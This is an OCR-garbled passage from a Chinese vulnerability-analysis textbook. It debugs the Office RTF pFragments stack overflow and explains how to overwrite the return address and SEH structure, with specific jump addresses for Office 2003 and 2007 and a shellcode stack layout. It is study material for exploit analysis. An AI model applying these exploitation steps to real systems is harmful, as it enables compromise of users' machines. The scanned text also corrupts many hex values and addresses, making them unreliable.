0:005>g
ModLoad: 768600ee 761b68e0
C: \WINDOWS\system32\SETUPAPI. d11
ModLoad: 76d7e88e 76d92888
C: \WINDOWS\system32\appHe1p.d11
ModLoad:
76598880 765de880
C : \WINDOWS\System32\cscu1 d11
ModLoad: 765788e0 7658c888
C: \WINDOWS\System32\CSCDLL .d11
ModLoad:
76960860
76984868
C: \WINDOwS\system32\ntshru1 . d11
ModLoad: 76af0000 76b1e00
C: \WINDOWS\system32\ATL.DLL
ModLoad: 759deeee
75a7feee
C:\WINDOWS\system32\USERENV.d11
ModLoad: 75efeeee 75fedeee
C: \WINDowS\system32\browseu1 . d11
ModLoad: 7e55eeee 7e6c1e88
C: \WIND0wS\system32\shdocvw. d11
ModLoad: 765e80ee 76673888
C: \WINDOWS\system32\CRYPT32 . d11
ModLoad: 76dbeeee 76dc2888
C: \WINDOwS\system32\MSASN1 .d11
ModLoad: 7543000e 754a1eee
C: \WINDOWS\syStem32\CRYPTUI d11
ModLoad: 76688888 76725888
C: \WINDONS\system32\WININET , d11
ModLoad: 76c8eee0 76c2e888
C: \WINDOWS\system32\WINTRUST . d11
ModLoad: 76c6eeee 76c888e0
C: \WINDOWS\system32\,IMAGEHLP, d11
ModLoad: 76f3eeee 76f5ceee
C: \WINDOWS\system32\WLDAP32 . d11
ModLoad: 769588ee 76958888
C: \WINDOWS\system32\LINKINFO.d11
ModLoad: e5818008 059b1ee0
C: \Program F11es\Microsoft 0ff1ce\0FFICE11\GdiPlus .DLL
Breakpoint e hit
eax=00123f88 ebx=000eee8 ecx=00123dfc edx=00eeeeee es1=0eeee0ee ed1=eee0e0
eip=30feb5c2 esp=08123dd4 ebp=00123e00 1op1=0
nv up e1 pl zr na pe nc
---
## Page 59
40
漏洞战争：软件漏洞分析精要
cs=B81bss=0023ds=0023es=0023fs=B03bgs=0060
ef1=0eeee246
mso10rdina11273+ex25d8:
3efeb5c2 55
push
ebp
按F10键单步跟踪：
e:008> p
eax=B8123f88 ebx=000ee0ee ecx=00123dfc edx=000eeeee es1=0ee0ee0 ed1=00eeeee
eip=3efeb5c3 esp=00123dde ebp=00123e0e iop1=0
nv. up ei pl zr na pe nc
CS=001b55=0623ds=0023es=0023fs=003bgs=008e
ef1=00088246
mso10rdina11273+8x25d9:
3efeb5c3 8bec
mOV
ebp,esp
d p
eax=38da33d8 ebx=e50000e0 ecx=00123dce edx=0000eee es1=011f11ee ed1=0e123f88
eip=3efeb5f8 esp=00123da4 ebp=00123dde iop1=0
nv up ei pl zr na pe nc
cs=001b5ss=0023ds=0023 es=0023fs=003bgs=0000
ef1=0eeee246
mso10rdina11273+ex268e:
3efeb5f8 ff5e1c
cal1
dword ptr [eax+1Ch]ds:0823:3eda33f4=38ed4486
按F8键跟进CrashFun函数，然后单步跟踪进去，可以发现用reqmovs指令复制内存时，ccx的值
为0x0000c8ac，即复制数据的大小，由于是操作dword字节，因此需要再除以4（逻辑右移2位）：
e:eee>p
eax=8880c8ac ebx=05000000 ecx=8000c8ac edx=0000008e es1=11048e8c ed1=00123dce
eip=38ed4429 esp=00123d98 ebp=00123dde iop1=0
nv up ei pl nz na pe nc
c5=Be1b
200=5p 208=s5
es=0023fs=e83b
gs=000e
ef1=0eeee206
mso10rdina11246+ex16ad:
30ed4429 c1e982
shr
ecx,2
e:00e> p
eax=0000c8ac ebx=05000000 ecx=8000322b edx=0000000e esi=1104808c 
edi=8e123dc0
eip=38ed442c esp=e0123d98 ebp=e0123dde iop1=0
nv up ei pl nz na pe nc
cs=Be1b
ss=0023 ds=0023
es=0023
fs=ee3b
gs=8800
ef1=0eeee2e6
mso10rdina11246+ex16be:
3Bed442c f3a5
rep movs dword ptr es:[ed1],dword ptr [esi]
---
## Page 60
第2章栈溢出漏润分析441
回头看下msf.rtf样本数据，可以发现上面的0xc&ac其实是源于样本数据的，它位于pFragements
属性值的第3个字段，偏移8个字符后的4个字符即为复制的数据大小，如图2-39所示，
BLOLCL35BL0L09CL2SEL1E99LZL35BL40000
BL0LCL929S949L9192L90L0229CL3S:40100
0020h:
02 9L 6235
ICIC TC IC TC TC TC TC EE SC EC tC
\sn pfrsgents)(
4000
516363
TC tE TE 3E 1E  OC CETE 9C 1E 
Bcc416130416131
IITTTITE-S-CA
00508: 33 24 34 3136 31 33 35 34 31 36 31:3336 34 31 3441613541613641
0040h:
TE SE TE $
TE SE TEEEECE TESEIEE PE EE
图2-39样本中代表复制内存大小的数据
而0xc&ac后面的数据正是实际内存复制的数据，复制内存源地址esi刚好指向这里：
0:000> db esi
118400Bc 41 61 3θ 41 61 31 41 61-32 41 61 33 41 61 34 41 AaBAa1Aa2Aa3Aa4A
1184881c 6135 41 61 36 41 6137-41 6138 41 6139 41 62 a5Aa6Aa7Aa8Aa9Ab
1104002c30 41 62 314162 32 41-62 33 41 62 34 4162 35eAb1Ab2Ab3Ab4Ab5
1184804c
1184005c 36 41 63 37 41 63 38 41-63 39 41 64 3e 41 64 31 6Ac7Ac8Ac9Ad0Ad1
1104806c
1104007c 64 37 41 64 38 41 64 39-41 65 30 41 65 31 41 65 d7Ad8Ad9Ae0Ae1Ae
复制内存的目标地址edi刚好偏移栈底ebp共0x10字节，加上ebp本身占用的4字节，刚好共0x14
字节，再覆盖下去就是函数的返回地址了：
pa-dq u 0x0026762F 11
0026762f ffd4
call
esp
该地址适用于Office2003SP0和SP3等各个子版本，属于稳定的跳转地址。对于Office2007.
0x0026762F上已不再是call/jmpesp等类似指令，当我们用0x0026762F这个地址覆盖Office2007上的
返回地址，只要能够让它触发异常，就可能执行SEH结构。这样的话，我们只须加大内存拷贝的大
小，使其覆盖到最近的SEH结构就可以劫持EIP。也就是说，我们需要同时覆盖返回地址和SEH结构。
我们构造覆盖栈的数据如下，长度为0x2al8：
11111111111111111111111111111111111111112f7626001111111111111111111111111111111111111
……省略部分内容…
---
## Page 62
第2章栈溢出漏洞分析43
11111111111111111111111111111111111111111111111111111111111111111111111111111111111111
关于SEH结构地址的定位，可以利用Metasploit上的两个工具pattem_create和pattem_offset定位偏
移量，因篇幅所限，本书不再赞述，更为详细的信息可参考笔者组织并参与翻译的《Exploit编写系
列教程》
下面是在Ofice2007SP0上的调试情况，我们已经成功覆盖返回地址为0x0026762f，同时nextSEH
和SHEHandler也分别被覆盖为全a和全f，如图2-41所示。
堆栈贝后执行
代码
开始复制的
找地址
异常处理结构中的
图2-41覆盖Office2007上的返回地址和SEH结构
然后进入函数0x32e5941b中继续跟踪，在0x32e59423处会判断[ebp+0x14]是否为0，而此时
[ebp+14]相当于[eip+0x14]，这里的eip是指我们覆盖的返回地址，若不为0则发生跳转，此时就会触
发异常。由于Ofice存在内部异常处理例程，因此也无法执行我们覆盖的SEHHandler，以致无法使
我们的eip得到执行，如图2-42所示。
---
## Page 63
44
漏洞战争：软件漏洞分析精要
图2-42执行异常
在函数0x32cf3807中会触发异常，我们跟进此函数：
32CF3887
55
PUSH EBP
32CF3888
8BEC
MOVEBP,ESP
32CF388A
8B45eC
MOV EAX,DHORD PTR SS:[EBP+C]
32CF3880
LEA EAX,DWORD PTR DS:[EAX*8+32CF3820】
：谁异的运算
32CF3814
8B48 04
MOV ECX, DWORD PTR DS: [EAX+4]
：触发异常的地址
32CF3817
81E1 FF000000
AND ECX,eFF
32CF3810
51
PUSH ECX
32CF381E
FF38
PUSH DWORD PTR DS:[EAX]
32CF3820
FF7508
PUSH DWORD PTR SS:[EBP+8]
32CF3823
E8 46989DFF
CALL mso.326CC86E
32CF3828
5D
POP EBP
32CF3829
C2
e8ee
RETN 8
为了能够让eip顺利地得到执行，我们必须令0x32e59426处的跳转不执行，也就是EIP+0x14处必
须为0x00000000，才能使执行流程能够顺序执行到retmn10。
---
## Page 64
第2章栈溢出漏润分析45
注意：不同语言、不同版本的Ofice存在较大差异，有时也受操作系统版本影响，可能在不
填0的情况下也不会触发异常，这里我们将此处填充为0，主要是提高一个利用的通用性，具
体以用户的调试环境为准。
利用pvefindaddr插件，我们找到地址0x00280b0b，其汇编在Office2007中稳定为：
ca11dword ptr[ebp+ex3e]
我们用这个地址覆盖SEHHandler，通过执行异常处理，再执行这个地址上的指令，最终会跳到
next SEH上，即0xaaaa地址。然后，我们再将aaaaa覆盖为eb 06 eb04jmp06,jmp04），以便跳
过SEHHandler，最后在SEH结构之后放置一个回跳指令，使其往回跳转到Shelloode地址，此时的栈
布局情况如图2-43所示。
用MPESP指地址
off203
011
1
Soel
oode.向
USERedle
x1
确保此值为.百元
IEHREP